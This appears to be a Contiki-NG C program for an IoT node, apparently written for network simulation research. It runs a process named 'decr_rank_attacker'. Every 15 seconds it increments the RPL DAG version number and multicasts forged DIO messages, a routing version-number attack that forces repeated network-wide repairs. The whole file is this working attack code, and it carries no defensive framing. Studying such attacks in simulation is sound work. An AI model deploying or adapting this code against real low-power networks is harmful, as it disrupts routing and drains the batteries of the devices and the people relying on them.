#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include <stdint.h>
#include <inttypes.h>
#include "rpl.h"
#include "net/packetbuf.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-icmp6.h"
#include "net/ipv6/uip.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1

/*---------------------------------------------------------------------------*/
PROCESS(decr_rank_attacker, "RPL DIO version modifier");
AUTOSTART_PROCESSES(&decr_rank_attacker);

/*---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(decr_rank_attacker, ev, data)
{
  static struct etimer periodic_timer;
  // uip_ipaddr_t root_ipaddr;
  // uip_ipaddr_t multicast_ipaddr;

  // uip_ip6addr(&multicast_ipaddr, 0xff02, 0, 0, 0, 0, 0, 0, 0x1a);

  PROCESS_BEGIN();

  // netstack_ip_packet_processor_add(&packet_processor);
  while (1) {
    etimer_set(&periodic_timer, CLOCK_SECOND * 15);
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));
    etimer_reset(&periodic_timer);

    // if (NETSTACK_ROUTING.node_is_reachable()
    //   && NETSTACK_ROUTING.get_root_ipaddr(&root_ipaddr)
    //   && curr_instance.dag.version)
    // {
      curr_instance.dag.version = (curr_instance.dag.version + 1) % 256;
      rpl_icmp6_dio_output(&rpl_multicast_addr);
      LOG_INFO("Sent DIO with version number: %d\n", curr_instance.dag.version);
    // }
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
